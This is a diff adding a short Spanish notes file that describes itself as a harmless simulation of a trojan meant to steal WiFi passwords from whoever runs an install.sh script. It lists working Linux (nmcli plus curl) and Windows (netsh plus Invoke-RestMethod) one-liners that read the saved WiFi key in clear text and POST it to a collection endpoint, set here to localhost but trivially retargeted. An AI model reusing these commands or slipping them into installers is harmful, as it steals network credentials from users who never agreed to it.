@@ -1,0 +1,21 @@
+#########################################################################################################################
+ESTE PROGRAMA ES UNA SIMULACIÓN SIMPLE DE UN TROYANO (INOFENSIVO) PARA ROBAR CLAVES DE WIFI DE QUIEN EJECUTE install.sh
+#########################################################################################################################
+
+#########################################################################################################################
+LINUX
+#########################################################################################################################
+//Obtener credencial de la red wifi actual conectada
+nmcli device wifi show-password | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://localhost:3000/wifi
+
+#########################################################################################################################
+WINDOWS
+#########################################################################################################################
+//Aún no probado xd
+$ssid = (netsh wlan show interface | Select-String -Pattern "^\s+SSID\s+:\s+(.+)$").Matches.Groups[1].Value.Trim(); netsh wlan show profile name="$ssid" key=clear | Invoke-RestMethod -Uri "http://localhost:3000/wifi" -Method Post -ContentType "text/plain"
+
+//Aún no probado (pero para este ocupas meter el nombre de la red)
+(netsh wlan show profile name="TU_RED" key=clear) | Invoke-RestMethod -Uri "http://localhost:3000/wifi" -Method Post -ContentType "text/plain"
+
+
+
